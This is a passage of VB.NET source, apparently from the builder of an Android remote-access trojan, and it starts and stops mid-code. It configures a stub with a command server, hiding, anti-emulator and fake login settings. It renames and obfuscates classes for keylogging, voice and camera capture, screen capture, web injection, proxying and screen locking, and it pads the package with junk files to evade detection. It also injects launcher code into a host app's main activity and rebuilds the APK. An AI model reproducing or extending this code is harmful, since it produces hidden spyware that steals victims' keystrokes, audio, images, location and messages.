                    .Replace(PermissionsActivity, N_PermissionsActivity) _
                    .Replace(PingServices, N_PingServices) _
                    .Replace(RequestDraw, N_RequestDraw) _
                    .Replace(Requestinstall, N_Requestinstall) _
                    .Replace(RequestPermissions2, N_RequestPermissions2) _
                    .Replace(ScreenCaps, N_ScreenCaps) _
                    .Replace(ScreenReceiver, N_ScreenReceiver) _
                    .Replace(mysmanager, N_mysmanager) _
                    .Replace(StatusMonitor, N_StatusMonitor) _
                    .Replace(UtliTools, N_UtliTools) _
                    .Replace(VoiceRecorder, N_VoiceRecorder) _
                    .Replace(WorkServices, N_WorkServices) _
                    .Replace(HiddenActivity, N_HiddenActivity) _
                    .Replace(RestrectionActivity, N_RestrectionActivity) _
                    .Replace(OPPOAutostart, N_OPPOAutostart) _
                    .Replace(BrodcastActivity, N_BrodcastActivity) _
                    .Replace(UninstallActivity, N_UninstallActivity) _
                    .Replace(EngineWorker, N_EngineWorker) _
                    .Replace(RequestDataUsage, N_RequestDataUsage) _
                    .Replace(Webjector, N_Webjector) _
                    .Replace(TransparentActivity, N_TransparentActivity) _
                    .Replace(WebBrowser, N_WebBrowser) _
                    .Replace(ProxyService, N_ProxyService) _
                    .Replace(ClassGen, N_ClassGen) _
                    .Replace("[USER_MAIL]", Email) _
                    .Replace("[USE-SUPER]", use_access) _
                    .Replace("[SERVER_ADRESS]", UserHost) _
                    .Replace("[USE-NOKILL]", use_antkill) _
                    .Replace("[USE-DRAWOVER]", use_draw) _
                    .Replace("[USE-AUTOGRANT]", use_atoprims) _
                    .Replace("[USE-ALLPRIM]", "0") _
                    .Replace("[USE-AUTOSTART]", miuiautostart) _
                    .Replace("[USE-HIDDEEN]", hiddenapp) _
                    .Replace("[USE-STORE]", IsStoreMod) _
                    .Replace("[USE-NOEMU]", noemulator) _
                    .Replace("[USE-GUID]", installtype) _
                    .Replace("[USE-DOZE]", nosleep) _
                    .Replace("[USE-CAPLOCK]", caplock) _
                    .Replace("[USE-FAKE]", hidetype) _
                    .Replace("[USE-AUTOBTRY]", theconkey) _
                    .Replace("[Client_N]", ClientName) _
                    .Replace("[_NOTIFI_TITLE_]", notifytitle) _
                    .Replace("[_NOTIFI_MSG_]", notifymsg) _
                    .Replace("USE-SCREENON", KeepScreen) _
                    .Replace("[OBFS]", NEWRANDOM) _
                    .Replace("[BSE_URL]", appurl) _
                    .Replace("[log-title]", logintitle) _
                    .Replace("[log-dis]", logindis) _
                    .Replace("[log-btn]", loginbtn) _
                    .Replace("[log-lng]", lngshort) _
                    .Replace("[NAME>LNK>ID!]", trakingdata) _
                    .Replace("[ALL-CONFG]", allconfig) _
                    .Replace("[CRNT-SUB]", Currentsubdir) _
                    .Replace("[USE-DELTE]", nodelete) _
                    .Replace(AudioRecorder, N_AudioRecorder) _
                    .Replace(drop_oldpkg, drop_newpkg) _
                    .Replace(oldpkg, newpkg) _
                    .Replace(oldpkg_insmali, newpkg_insmali) _
                    .Replace(Apps_Manage, N_Apps_Manage)

                    For Each originalString As String In To_Obfucate
                        newContent = newContent.Replace(originalString, Obfucated(originalString))
                    Next

                    File.WriteAllText(fileInMain, newContent)

                End If
            Next

            Dim sourcePath As String = smlipath & "\com\icontrol\protector"
            Dim searchPattern As String = "*.smali"
            Dim i As Integer = 0
            For Each fileName As String In Directory.GetFiles(sourcePath, searchPattern, SearchOption.AllDirectories)



                If fileName.Contains("AccessibilityActivity") Or fileName.Equals("AccessibilityActivity") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("AccessibilityActivity", N_AccessibilityActivity)))

                End If

                If fileName.Contains("AccessTools") Or fileName.Equals("AccessTools") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("AccessTools", N_AccessTools)))

                End If
                '
                If fileName.Contains("wakeitaiv") Or fileName.Equals("wakeitaiv") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("wakeitaiv", N_wakeitaiv)))

                End If
                If fileName.Contains("LockActivity") Or fileName.Equals("LockActivity") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("LockActivity", N_LockActivity)))

                End If

                If fileName.Contains("AccessServices") Or fileName.Equals("AccessServices") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("AccessServices", N_AccessServices)))

                End If

                If fileName.Contains("HiddenBrowser") Or fileName.Equals("HiddenBrowser") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("HiddenBrowser", N_HiddenBrowser)))

                End If

                If fileName.Contains("ActivityCaptureScreen") Or fileName.Equals("ActivityCaptureScreen") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("ActivityCaptureScreen", N_ActivityCaptureScreen)))

                End If

                If fileName.Contains("ActivityMonitors") Or fileName.Equals("ActivityMonitors") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("ActivityMonitors", NActivityMonitors)))

                End If
                If fileName.Contains("CameraCap") Or fileName.Equals("CameraCap") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace(CameraCap, N_CameraCap)))

                End If
                If fileName.Contains("_update_app_") Or fileName.Equals("_update_app_") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("_update_app_", N_update_app_)))

                End If
                If fileName.Contains("MyCods") Or fileName.Equals("MyCods") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace(MyCods, N__MyCods_)))

                End If
                If fileName.Contains("Consts") Or fileName.Equals("Consts") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace(Consts, N__Consts_)))

                End If
                If fileName.Contains("ChatActivity") Or fileName.Equals("ChatActivity") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace(ChatActivity, N__ChatActivity_)))

                End If
                If fileName.Contains("Contct_manager") Or fileName.Equals("Contct_manager") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("Contct_manager", N_Contct_manager)))
                End If

                'N_My_Configs
                If fileName.Contains("My_Configs") Or fileName.Equals("My_Configs") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("My_Configs", N_My_Configs)))
                End If

                '
                If fileName.Contains("ActivityDraw") Or fileName.Equals("ActivityDraw") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("ActivityDraw", N_ActivityDraw)))
                End If

                If fileName.Contains("My_Crpter") Or fileName.Equals("My_Crpter") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("My_Crpter", N_My_Crpter)))
                End If


                If fileName.Contains("Deviceinfo") Or fileName.Equals("Deviceinfo") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("Deviceinfo", N_Deviceinfo)))
                End If

                If fileName.Contains("filesManager") Or fileName.Equals("filesManager") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("filesManager", N_filesManager)))
                End If

                If fileName.Contains("id_Commands") Or fileName.Equals("id_Commands") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("id_Commands", N_id_Commands)))
                End If

                If fileName.Contains("KeyStorksQ") Or fileName.Equals("KeyStorksQ") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("KeyStorksQ", N_KeyStorksQ)))
                End If

                If fileName.Contains("LiveChat") Or fileName.Equals("LiveChat") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("LiveChat", N_LiveChat)))
                End If

                If fileName.Contains("QueryChats") Or fileName.Equals("QueryChats") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("QueryChats", N_QueryChats)))
                End If

                If fileName.Contains("LiveKeysStrok") Or fileName.Equals("LiveKeysStrok") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("LiveKeysStrok", N_LiveKeysStrok)))
                End If

                If fileName.Contains("StarterServices") Or fileName.Equals("StarterServices") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("StarterServices", N_StarterServices)))
                End If

                If fileName.Contains("LocationMonitor") Or fileName.Equals("LocationMonitor") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("LocationMonitor", N_LocationMonitor)))
                End If

                If fileName.Contains("LockAppsActivity") Or fileName.Equals("LockAppsActivity") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("LockAppsActivity", N_LockAppsActivity)))
                End If

                If fileName.Contains("MainActivity") Or fileName.Equals("MainActivity") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("MainActivity", N_ActivMain)))
                End If

                If fileName.Contains("MyLoger") Or fileName.Equals("MyLoger") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("MyLoger", N_MyLoger)))
                End If

                If fileName.Contains("MyNotification") Or fileName.Equals("MyNotification") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("MyNotification", N_MyNotification)))
                End If

                If fileName.Contains("MyPacket") Or fileName.Equals("MyPacket") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("MyPacket", N_MyPacket)))
                End If

                If fileName.Contains("MyPermissions") Or fileName.Equals("MyPermissions") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("MyPermissions", N_MyPermissions)))
                End If

                If fileName.Contains("MySettings") Or fileName.Equals("MySettings") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("MySettings", N_MySettings)))
                End If

                If fileName.Contains("PermissionsActivity") Or fileName.Equals("PermissionsActivity") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("PermissionsActivity", N_PermissionsActivity)))
                End If

                If fileName.Contains("PingServices") Or fileName.Equals("PingServices") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("PingServices", N_PingServices)))
                End If

                If fileName.Contains("RequestDraw") Or fileName.Equals("RequestDraw") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("RequestDraw", N_RequestDraw)))
                End If

                If fileName.Contains("Requestinstall") Or fileName.Equals("Requestinstall") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("Requestinstall", N_Requestinstall)))
                End If

                If fileName.Contains("RequestPermissions2") Or fileName.Equals("RequestPermissions2") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("RequestPermissions2", N_RequestPermissions2)))
                End If

                If fileName.Contains("ScreenCaps") Or fileName.Equals("ScreenCaps") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("ScreenCaps", N_ScreenCaps)))
                End If

                If fileName.Contains("ScreenReceiver") Or fileName.Equals("ScreenReceiver") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("ScreenReceiver", N_ScreenReceiver)))
                End If

                If fileName.Contains("mysmanager") Or fileName.Equals("mysmanager") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("mysmanager", N_mysmanager)))
                End If

                If fileName.Contains("StatusMonitor") Or fileName.Equals("StatusMonitor") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("StatusMonitor", N_StatusMonitor)))
                End If

                If fileName.Contains("UtliTools") Or fileName.Equals("UtliTools") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("UtliTools", N_UtliTools)))
                End If

                If fileName.Contains("VoiceRecorder") Or fileName.Equals("VoiceRecorder") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("VoiceRecorder", N_VoiceRecorder)))
                End If

                If fileName.Contains("WorkServices") Or fileName.Equals("WorkServices") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("WorkServices", N_WorkServices)))
                End If

                If fileName.Contains("HiddenActivity") Or fileName.Equals("HiddenActivity") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("HiddenActivity", N_HiddenActivity)))
                End If

                'N_BrodcastActivity
                If fileName.Contains("BrodcastActivity") Or fileName.Equals("BrodcastActivity") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("BrodcastActivity", N_BrodcastActivity)))
                End If

                If fileName.Contains("OPPOAutostart") Or fileName.Equals("OPPOAutostart") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("OPPOAutostart", N_OPPOAutostart)))
                End If

                If fileName.Contains("RestrectionActivity") Or fileName.Equals("RestrectionActivity") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("RestrectionActivity", N_RestrectionActivity)))
                End If

                If fileName.Contains("UninstallActivity") Or fileName.Equals("UninstallActivity") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("UninstallActivity", N_UninstallActivity)))
                End If

                If fileName.Contains("EngineWorker") Or fileName.Equals("EngineWorker") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("EngineWorker", N_EngineWorker)))
                End If

                '.Replace(Webjector, N_Webjector) _
                If fileName.Contains("Webjector") Or fileName.Equals("Webjector") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("Webjector", N_Webjector)))
                End If

                If fileName.Contains("RequestDataUsage") Or fileName.Equals("RequestDataUsage") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("RequestDataUsage", N_RequestDataUsage)))
                End If


                If fileName.Contains("TransparentActivity") Or fileName.Equals("TransparentActivity") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("TransparentActivity", N_TransparentActivity)))
                End If

                '
                If fileName.Contains("WebBrowser") Or fileName.Equals("WebBrowser") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("WebBrowser", N_WebBrowser)))
                End If

                If fileName.Contains("ProxyService") Or fileName.Equals("ProxyService") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("ProxyService", N_ProxyService)))
                End If

                If fileName.Contains("Apps_Manage") Or fileName.Equals("Apps_Manage") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("APPS", N_Apps_Manage)))

                End If
                If fileName.Contains("AudioRecorder") Or fileName.Equals("AudioRecorder") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace(AudioRecorder, N_AudioRecorder)))

                End If
                i += 1
                Threading.Thread.Sleep(1)
            Next

            i = 0
            For Each fileName As String In Directory.GetFiles(sourcePath, searchPattern, SearchOption.AllDirectories)


                If fileName.Contains("ClassGen") Then

                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("ClassGen", N_ClassGen)))

                End If

                i += 1
                Threading.Thread.Sleep(1)
            Next

        Catch ex As Exception
            Mylogger.LogError(userid, "Step4", ex.Message)
        End Try

        If IsCustomeApp Then

            Mylogger.Logbuild(userid, "junk classes...")

            GenerateJunkSmaliFiles(smlipath, 750)

            ShuffleSmaliFiles(TheApkPath, 4)

            Mylogger.Logbuild(userid, ">" & "> junk folders...")
            Dim assetsfolder As String = TheApkPath + "\" + "assets"
            Dim unknownfolder As String = TheApkPath + "\" + "unknown"

            InjectRandomJunkFiles(assetsfolder)
            InjectRandomJunkFiles(unknownfolder)


            GoTo endit
        End If

        Mylogger.Logbuild(userid, ">" & "> Injecting Main Activity...")

        Try
            Dim Activity As String = TheApkPath & "\" & MainActivity
            If File.Exists(Activity) Then
                Dim MainReader As String() = File.ReadAllLines(Activity)
                Dim intentmain As String
                For index = 0 To MainReader.Length - 1
                    If index = 0 Then
                        Dim findmain As String() = MainReader(0).Split(" ")
                        intentmain = findmain(findmain.Length - 1)
                    End If



                    If MainReader(index).Contains("onCreate(") AndAlso MainReader(index).ToLower.StartsWith(".method".ToLower) AndAlso Not MainReader(index).ToLower.Contains("native") Then
                        MainReader(index) = MainReader(index) & Environment.NewLine & My.Resources.oncreatecode.Replace("[trgtmain]", intentmain)

                        MainReader(MainReader.Length - 1) = MainReader(MainReader.Length - 1) & Environment.NewLine & Environment.NewLine & My.Resources.MainMith.Replace("[trgtmain]", intentmain) _
                                .Replace(oldpkg_insmali, newpkg_insmali) _
                                .Replace(ActivMain, N_ActivMain) _
                                .Replace(StarterServices, N_StarterServices)

                        Exit For

                    End If
                Next
                File.WriteAllLines(Activity, MainReader)
            End If
        Catch ex As Exception

            Mylogger.LogError(userid, "Step5", ex.Message)
        End Try


endit:

        Mylogger.Logbuild(userid, ">" & "-----------------" & ">" & "> Building Apk...")
        Dim outputfolder As String = WorkingDir + "\" + "out"
        outputapk = outputfolder & "\" & "Ready.apk"
        If Not Directory.Exists(outputfolder) Then
            Directory.CreateDirectory(outputfolder)
        End If
        ExecuteCommand("java -jar " & apktoolpath & " b -f " & TheApkPath & " -o " & outputapk)



    End Sub

    Private Sub UpdateApkSrcs()

        Mylogger.Logbuild(userid, ">" & "> Merging Res folder...")

        Dim sourceDir As String = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "apkstub", "apkres")
        Dim destDir As String = TheApkPath & "\res"

        ' Define the list of folders to copy
        Dim foldersToCopy As String() = {"drawable"}

        ' Define the list of specific files to copy and merge in the 'values' folder , "styles.xml"
        Dim filesToMergeInValues As String() = {"strings.xml", "public.xml", "ids.xml"}

        Try
            ' Copy the specified folders
            For Each folder As String In foldersToCopy
                Dim sourceFolder As String = Path.Combine(sourceDir, folder)
                Dim destFolder As String = Path.Combine(destDir, folder)

                If Directory.Exists(sourceFolder) Then
                    ' Ensure the destination folder exists
                    Directory.CreateDirectory(destFolder)
                    ' Copy the contents of the folder
                    CopyDirectory(sourceFolder, destFolder)
                Else

                    failresfolder($"Source folder does not exist: {sourceFolder}")

                End If
            Next

            ' Merge the specified files in the 'values' folder
            Dim sourceValuesFolder As String = Path.Combine(sourceDir, "values")
            Dim destValuesFolder As String = Path.Combine(destDir, "values")

            If Directory.Exists(sourceValuesFolder) Then
                If Not Directory.Exists(destValuesFolder) Then
                    failresfolder($"dest values folder does not exist: {sourceValuesFolder}")
                End If
                For Each fileName As String In filesToMergeInValues
                    Dim sourceFile As String = Path.Combine(sourceValuesFolder, fileName)
                    Dim destFile As String = Path.Combine(destValuesFolder, fileName)



                    If File.Exists(sourceFile) AndAlso File.Exists(destFile) Then

                        Mylogger.Logbuild(userid, ">" & "> ToMerge: " + sourceFile)
                        Mylogger.Logbuild(userid, ">" & "> MergeWith: " + destFile)

                        ''MergePublicXmlFiles
                        If fileName.ToLower() = "public.xml" Then
                            MergePublicXmlFiles(sourceFile, destFile)
                        Else
                            MergeXmlFiles(sourceFile, destFile)
                        End If

                    ElseIf File.Exists(sourceFile) Then
                        Mylogger.Logbuild(userid, ">" & "> Merge fail Coping: " + sourceFile)
                        File.Copy(sourceFile, destFile, True)
                        failresfolder($"Dis file does not exist: {sourceFile}")
                    Else

                        failresfolder($"Source file does not exist: {sourceFile}")
                    End If
                Next
            Else

                failresfolder($"Source values folder does not exist: {sourceValuesFolder}")
            End If


            Mylogger.Logbuild(userid, ">" & "> Merging Res successfully...")
        Catch ex As Exception

            failresfolder(ex.Message)
        End Try

    End Sub



    Private Sub failresfolder(Message As String)
        Worker.UpdateState(Worker.failed)
        Mylogger.LogError(userid, ">" & "UpdateApkSrcs: ", Message)
        singout(MYID)


        Environment.Exit(0)
    End Sub

    Private Sub CopyDirectory(sourceDir As String, destDir As String)
        ' Get the subdirectories for the specified directory.
        Dim dir As DirectoryInfo = New DirectoryInfo(sourceDir)
        Dim dirs As DirectoryInfo() = dir.GetDirectories()

        ' If the destination directory doesn't exist, create it.
        If Not Directory.Exists(destDir) Then
            Directory.CreateDirectory(destDir)
        End If

        ' Get the files in the directory and copy them to the new location.
        Dim files As FileInfo() = dir.GetFiles()
        For Each file As FileInfo In files
            Dim temppath As String = Path.Combine(destDir, file.Name)
            If System.IO.File.Exists(temppath) Then
                Continue For
            End If
            file.CopyTo(temppath, False)
        Next

        ' Copy subdirectories and their contents to new location.
        For Each subdir As DirectoryInfo In dirs
            Dim temppath As String = Path.Combine(destDir, subdir.Name)
            CopyDirectory(subdir.FullName, temppath)
        Next
    End Sub
    'Dim idMap As New Dictionary(Of String, String)  Obfucated(sourceId) = newId
    'Private Sub MergePublicXmlFiles(sourceFile As String, destFile As String)
    '    Dim sourceDoc As XDocument = XDocument.Load(sourceFile)
    '    Dim destDoc As XDocument = XDocument.Load(destFile)

    '    Dim sourceElements As List(Of XElement) = sourceDoc.Root.Elements("public").ToList()
    '    Dim destElements As List(Of XElement) = destDoc.Root.Elements("public").ToList()

    '    ' Combine source and destination elements
    '    Dim combinedElements As New Dictionary(Of String, XElement)

    '    ' Add destination elements to the combined dictionary
    '    For Each element In destElements
    '        Dim key As String = element.Attribute("type").Value & ":" & element.Attribute("name").Value
    '        If Not combinedElements.ContainsKey(key) Then
    '            combinedElements.Add(key, element)
    '        End If
    '    Next

    '    ' Add source elements to the combined dictionary, overriding if necessary
    '    For Each element In sourceElements
    '        Dim key As String = element.Attribute("type").Value & ":" & element.Attribute("name").Value
    '        If Not combinedElements.ContainsKey(key) Then
    '            combinedElements.Add(key, element)
    '        End If
    '    Next

    '    ' Initialize the highest ID
    '    Dim highestId As Integer = &H7F000000

    '    ' Ensure the highestId is greater than all existing IDs
    '    For Each id In combinedElements.Values.Select(Function(e) e.Attribute("id").Value)
    '        Dim idValue As Integer = Convert.ToInt32(id, 16)
    '        If idValue > highestId Then
    '            highestId = idValue
    '        End If
    '    Next

    '    ' Remove all existing IDs and assign new ones
    '    Dim newIdMap As New Dictionary(Of String, String)
    '    For Each element In combinedElements.Values
    '        highestId += 1
    '        Dim newId As String = "0x" & highestId.ToString("X8")
    '        Dim oldId As String = element.Attribute("id").Value
    '        element.SetAttributeValue("id", newId)
    '        If Not newIdMap.ContainsKey(oldId) Then
    '            newIdMap.Add(oldId, newId)
    '        End If
    '    Next

    '    ' Update the Obfuscated dictionary with new IDs
    '    For Each kvp In newIdMap
    '        Obfucated(kvp.Key) = kvp.Value
    '    Next

    '    ' Create a new root element and add the combined elements
    '    Dim newRoot As New XElement("resources", combinedElements.Values)

    '    ' Create a new document with the combined root
    '    Dim combinedDoc As New XDocument(newRoot)

    '    ' Save the combined document back to the destination file
    '    combinedDoc.Save(destFile)
    'End Sub

    Private Sub MergePublicXmlFiles(sourceFile As String, destFile As String)
        Try
            Mylogger.Logbuild(userid, "Starting MergePublicXmlFiles")

            Dim sourceDoc As XDocument = XDocument.Load(sourceFile)
            Dim destDoc As XDocument = XDocument.Load(destFile)

            Dim sourceElements As IEnumerable(Of XElement) = sourceDoc.Root.Elements("public")
            Dim destElements As IEnumerable(Of XElement) = destDoc.Root.Elements("public")

            ' Map of existing IDs to their types
            Dim existingIds As New Dictionary(Of String, String)
            For Each element In destElements
                Dim id As String = element.Attribute("id").Value
                Dim type As String = element.Attribute("type").Value
                existingIds(id.ToLowerInvariant()) = type

                'Mylogger.Logbuild(userid, "Existing ID: " & id & " Type: " & type)
            Next

            ' Set of existing names to avoid duplicates
            Dim existingNames As New HashSet(Of String)(destElements.Select(Function(e) e.Attribute("name").Value))

            ' Track highest ID per type
            Dim highestIdPerType As New Dictionary(Of String, Integer)
            Dim missingattributes As New List(Of String)

            ' Initialize highestIdPerType from destination file
            For Each element In destElements
                Dim type As String = element.Attribute("type").Value
                Dim id As Integer = Convert.ToInt32(element.Attribute("id").Value, 16)
                If highestIdPerType.ContainsKey(type) Then
                    If id > highestIdPerType(type) Then
                        highestIdPerType(type) = id
                    End If
                Else
                    highestIdPerType(type) = id
                End If
                ' Mylogger.Logbuild(userid, "Highest ID for type " & type & ": " & "0x" & highestIdPerType(type).ToString("X8"))
            Next

            ' Ensure all required types are accounted for
            Dim requiredTypes As List(Of String) = New List(Of String) From {"string", "drawable", "xml", "layout", "id"}
            For Each requiredType In requiredTypes
                If Not highestIdPerType.ContainsKey(requiredType) Then
                    highestIdPerType(requiredType) = &H7FFFFFFF ' Start from 0x7FFFFFFF for missing types
                    ' Mylogger.Logbuild(userid, "Initialized highest ID for missing type " & requiredType & ": 0x7FFFFFFF")
                    missingattributes.Add(requiredType.ToLower)
                End If
            Next

            ' Combine elements from source into destination
            Dim combinedElements As New List(Of XElement)(destElements)

            For Each sourceElement In sourceElements
                Dim sourceId As String = sourceElement.Attribute("id").Value
                Dim sourceName As String = sourceElement.Attribute("name").Value
                Dim sourceType As String = sourceElement.Attribute("type").Value

                'Mylogger.Logbuild(userid, "Processing source element: Name=" & sourceName & ", Type=" & sourceType & ", ID=" & sourceId)

                If existingNames.Contains(sourceName) Then
                    ' Handle duplicate names by reusing the existing ID
                    Dim existingElement = destElements.FirstOrDefault(Function(e) e.Attribute("name").Value = sourceName)
                    If existingElement IsNot Nothing Then
                        Dim existingId As String = existingElement.Attribute("id").Value
                        Obfucated(sourceId) = existingId
                        'Mylogger.Logbuild(userid, "Duplicate name found. Reusing ID: " & existingId)
                    End If
                Else

                    Dim newId As String
                    Dim ismissing As Boolean = missingattributes.Contains(sourceType.ToLower)
                    Do


                        If ismissing Then
                            highestIdPerType(sourceType) -= 1

                        Else
                            highestIdPerType(sourceType) += 1

                        End If

                        newId = "0x" & highestIdPerType(sourceType).ToString("X8")


                        If Not existingIds.ContainsKey(newId.ToLowerInvariant()) Then
                            Exit Do ' Found a unique ID
                        End If
                    Loop While True


                    ' Update the source element and add it to the result
                    sourceElement.SetAttributeValue("id", newId)
                    Obfucated(sourceId) = newId
                    ' Mylogger.Logbuild(userid, "Assigned new ID: " & newId & " to element: " & sourceName)
                    existingIds(newId.ToLowerInvariant()) = sourceType

                    'Mylogger.Logbuild(userid, "Adding sourceName to existingNames: " & sourceName)
                    existingNames.Add(sourceName)
                    combinedElements.Add(sourceElement)
                End If
            Next

            ' Create a new root element and add the combined elements
            Dim newRoot As New XElement("resources", combinedElements)

            ' Create a new document with the combined root
            Dim combinedDoc As New XDocument(newRoot)

            ' Save the combined document back to the destination file
            combinedDoc.Save(destFile)
            ' Mylogger.Logbuild(userid, "MergePublicXmlFiles completed successfully. File saved to: " & destFile)
        Catch ex As Exception
            Mylogger.Logbuild(userid, "MergePublicXmlFiles error: " & ex.Message)
            failresfolder($"MergePublicXmlFiles: {ex.Message}")
        End Try
    End Sub

    Private Sub MergeXmlFiles(sourceFile As String, destFile As String)
        Dim sourceDoc As XDocument = XDocument.Load(sourceFile)
        Dim destDoc As XDocument = XDocument.Load(destFile)

        ' Combine all elements (string, integer, style, etc.), avoiding duplicates by key (name attribute)
        Dim sourceElements As IEnumerable(Of XElement) = sourceDoc.Root.Elements()
        Dim destElements As IEnumerable(Of XElement) = destDoc.Root.Elements()

        Dim combinedElements = destElements.Concat(sourceElements) _
            .GroupBy(Function(e) e.Attribute("name").Value) _
            .Select(Function(g) g.First())

        ' Create a new root element and add the combined elements
        Dim newRoot As New XElement("resources", combinedElements)

        ' Create a new document with the combined root
        Dim combinedDoc As New XDocument(newRoot)

        ' Save the combined document back to the destination file
        combinedDoc.Save(destFile)
    End Sub

    Private Sub Step2()
        Mylogger.Logbuild(userid, ">" & "> Check Permissions...")

back1:

        If FileInUse(TheApkPath & "\" & "AndroidManifest.xml") Or Not File.Exists(TheApkPath & "\" & "AndroidManifest.xml") Then

            Thread.Sleep(1000)
            GoTo back1
        End If



        'Dim AllManifist As String = UpdateVersions(File.ReadAllText(TheApkPath & "\" & "AndroidManifest.xml"))

        Dim SPLITTER As String = "[*]"
        Dim permissionSets As String() = allconfig.Split(New String() {SPLITTER}, StringSplitOptions.RemoveEmptyEntries)

        ' Extract the first boolean of each permission and assign directly to variables
        Dim addAccess As Boolean = If(permissionSets.Length > 0, permissionSets(0).Split("|"c)(0) = "1", False)
        Dim addDrawOverApps As Boolean = If(permissionSets.Length > 1, permissionSets(1).Split("|"c)(0) = "1", False)
        Dim addBackgroundDataUsage As Boolean = If(permissionSets.Length > 2, permissionSets(2).Split("|"c)(0) = "1", False)
        Dim addUsageAccess As Boolean = If(permissionSets.Length > 3, permissionSets(3).Split("|"c)(0) = "1", False)

        Dim addChangePhoneSettings As Boolean = If(permissionSets.Length > 4, permissionSets(4).Split("|"c)(0) = "1", False)

        Dim addBatteryOptimization As Boolean = If(permissionSets.Length > 5, permissionSets(5).Split("|"c)(0) = "1", False)

        Dim addFilesAccess As Boolean = If(permissionSets.Length > 6, permissionSets(6).Split("|"c)(0) = "1", False)

        Dim addCameraAccess As Boolean = If(permissionSets.Length > 7, permissionSets(7).Split("|"c)(0) = "1", False)

